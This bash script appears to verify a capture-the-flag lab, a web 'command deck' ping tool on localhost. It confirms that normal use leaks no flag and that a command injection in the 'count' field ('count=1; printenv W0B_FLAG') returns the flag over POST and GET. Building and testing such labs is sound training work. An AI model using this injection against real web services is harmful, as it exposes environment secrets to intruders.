#!/usr/bin/env bash
# w06 command-deck :: self-verifying probe.
#
#   ./probe.sh                       # http://localhost:30006
#   ./probe.sh http://host:port
#
# Asserts BOTH directions:
#   1. the normal (non-injected) run works and leaks no flag -- the deck is a
#      working tool, and path guessing / passive reading gets nothing;
#   2. the injection through the count field returns the flag -- the lab is
#      solvable only by executing a command that reads the environment.
set -uo pipefail

BASE="${1:-http://localhost:30006}"
fail=0

check() { # check <label> <expected-substring> <actual>
  if [[ "$3" == *"$2"* ]]; then
    printf '  ok   %s\n' "$1"
  else
    printf '  FAIL %s\n       expected to contain: %s\n       got: %s\n' "$1" "$2" "$3"
    fail=1
  fi
}

refute() { # refute <label> <forbidden-substring> <actual>
  if [[ "$3" != *"$2"* ]]; then
    printf '  ok   %s\n' "$1"
  else
    printf '  FAIL %s\n       must NOT contain: %s\n       got: %s\n' "$1" "$2" "$3"
    fail=1
  fi
}

printf '[*] target %s\n' "$BASE"

# --- direction 1: the tool works normally and gives nothing away -------------
check "landing page serves"       "COMMAND DECK" "$(curl -s "$BASE/")"
check "meta tag present"          '<meta name="lab" content="w06">' "$(curl -s "$BASE/")"
refute "landing leaks no flag"    'hex4b0t{' "$(curl -s "$BASE/")"

# Normal run: real ping, real output, no flag anywhere in it.
normal=$(curl -s "$BASE/" --data-urlencode 'tool=ping' --data-urlencode 'host=127.0.0.1' --data-urlencode 'count=1')
check  "normal ping runs"         'bytes from' "$normal"
refute "normal run leaks no flag" 'hex4b0t{' "$normal"

# Quoted host is NOT executable: the host field alone must not be an injection.
quoted=$(curl -s "$BASE/" --data-urlencode 'tool=ping' --data-urlencode "host=127.0.0.1; printenv W0B_FLAG" --data-urlencode 'count=1')
refute "quoted host not injectable" 'hex4b0t{' "$quoted"

# No web path serves the flag file; env is the only source.
refute "flag not on disk"         'hex4b0t{' "$(curl -s "$BASE/flag.txt")"

# --- direction 2: the injection via count ------------------------------------
inj=$(curl -s "$BASE/" \
  --data-urlencode 'tool=ping' \
  --data-urlencode 'host=127.0.0.1' \
  --data-urlencode 'count=1; printenv W0B_FLAG')
check "count field injects"       'hex4b0t{' "$inj"
# The runtime fallback is hex4b0t{REPLACED_AT_RUNTIME}; a live value proves the
# payload really read the injected env var, not the PHP fallback constant.
refute "real env var, not fallback" 'REPLACED_AT_RUNTIME' "$inj"

# Same injection over GET (same sink, both surfaces).
inj_get=$(curl -s --get "$BASE/" --data-urlencode 'tool=ping' --data-urlencode 'host=127.0.0.1' --data-urlencode 'count=1; printenv W0B_FLAG')
check "GET surface injects too"   'hex4b0t{' "$inj_get"

if [[ $fail -eq 0 ]]; then
  printf '\n[+] w06 solvable via command injection, normal path clean\n'
else
  printf '\n[!] w06 probe FAILED\n'
fi
exit $fail
